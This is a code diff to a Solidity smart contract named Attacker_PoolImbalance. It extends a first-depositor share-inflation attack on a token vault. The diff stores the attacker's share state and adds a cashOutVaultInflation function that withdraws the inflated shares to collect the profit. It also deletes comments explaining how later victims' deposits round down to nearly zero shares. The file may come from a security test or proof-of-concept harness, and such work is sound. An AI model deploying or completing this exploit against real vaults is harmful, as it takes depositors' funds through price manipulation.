@@ -15,6 +15,7 @@ pragma solidity ^0.8.19;
 
 import "../interfaces/CommonInterfaces.sol";
 
+
 interface IVault {
     function deposit(uint256 assets) external returns (uint256 shares);
     function withdraw(uint256 shares) external returns (uint256 assets);
@@ -34,6 +35,11 @@ interface IStablePool {
 contract Attacker_PoolImbalance {
     address public owner;
     
+    // thêm state variable
+    uint256 public inflationAttackShares;
+    address public inflationAttackVault;
+    address public inflationAttackAsset;
+
     event AttackInitiated(string attackType);
     event VaultManipulated(uint256 sharesBefore, uint256 sharesAfter, uint256 profit);
     event StablePoolExploited(uint256 profit);
@@ -54,21 +60,18 @@ contract Attacker_PoolImbalance {
         
         IVault vaultContract = IVault(vault);
         
-        // Step 1: Be the first depositor with 1 wei
         IERC20(asset).approve(vault, type(uint256).max);
+
+        // Step 1: Be the first depositor with 1 wei
         uint256 sharesBefore = vaultContract.deposit(1);
+
+        // lưu lại shares để cash out sau
+        inflationAttackShares = sharesBefore;
+        inflationAttackVault = vault;
+        inflationAttackAsset = asset;
         
         // Step 2: Donate large amount to inflate share price
         IERC20(asset).transfer(vault, donationAmount);
-        
-        // Now share price is inflated:
-        // totalAssets = 1 + donationAmount
-        // totalShares = 1
-        // share value = (1 + donationAmount) / 1
-        
-        // Step 3: Next victim deposits will get rekt due to rounding
-        // If victim deposits donationAmount/2, they get:
-        // shares = (donationAmount/2 * 1) / (1 + donationAmount) ≈ 0 (rounds down!)
         
         uint256 sharesAfter = vaultContract.totalShares();
         emit VaultManipulated(sharesBefore, sharesAfter, donationAmount);
@@ -181,6 +184,30 @@ contract Attacker_PoolImbalance {
     function fund(address token, uint256 amount) external {
         IERC20(token).transfer(address(this), amount);
     }
+
+
+    function cashOutVaultInflation() external onlyOwner returns (uint256 assetsOut) {
+        require(inflationAttackVault != address(0), "No inflation attack state");
+
+        IVault vaultContract = IVault(inflationAttackVault);
+        IERC20 assetToken = IERC20(inflationAttackAsset);
+
+        uint256 sharesToWithdraw = inflationAttackShares;
+        uint256 balanceBefore = assetToken.balanceOf(address(this));
+
+        assetsOut = vaultContract.withdraw(sharesToWithdraw);
+
+        uint256 balanceAfter = assetToken.balanceOf(address(this));
+
+        if (assetsOut == 0 && balanceAfter > balanceBefore) {
+            assetsOut = balanceAfter - balanceBefore;
+        }
+
+        inflationAttackShares = 0;
+        inflationAttackVault = address(0);
+        inflationAttackAsset = address(0);
+    }
+
 
     receive() external payable {}
 }
